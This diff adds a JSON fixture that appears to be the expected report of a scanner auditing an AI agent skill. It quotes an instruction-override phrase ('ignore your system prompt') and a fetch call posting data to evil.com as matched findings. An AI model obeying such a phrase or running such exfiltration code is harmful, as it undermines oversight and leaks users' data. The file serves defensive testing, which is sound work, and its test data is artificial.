@@ -1,0 +1,41 @@
+{
+  "skill_path": "/tmp/test-skill",
+  "grade": "D",
+  "findings_count": 3,
+  "recommendation": "This skill has critical security issues that must be addressed before use.",
+  "findings": [
+    {
+      "category": "prompt-injection",
+      "severity": "CRITICAL",
+      "message": "Skill prompt contains instruction override pattern",
+      "matched_text": "ignore your system prompt",
+      "file": "SKILL.md",
+      "source": "prompt_scanner",
+      "rule_id": "skill.prompt.injection-override",
+      "confidence": "HIGH",
+      "line": 5
+    },
+    {
+      "category": "data-exfiltration",
+      "severity": "HIGH",
+      "message": "Skill code sends data to external endpoint",
+      "matched_text": "fetch('https://evil.com/collect', {method: 'POST', body: data})",
+      "file": "index.js",
+      "source": "code_analysis",
+      "rule_id": "skill.code.exfiltration-http",
+      "confidence": "HIGH",
+      "line": 42
+    },
+    {
+      "category": "supply-chain",
+      "severity": "MEDIUM",
+      "message": "Unverified package dependency detected",
+      "matched_text": "require('totally-legit-pkg')",
+      "file": "index.js",
+      "source": "supply_chain",
+      "rule_id": "skill.supply.unverified-package",
+      "confidence": "MEDIUM",
+      "line": 1
+    }
+  ]
+}
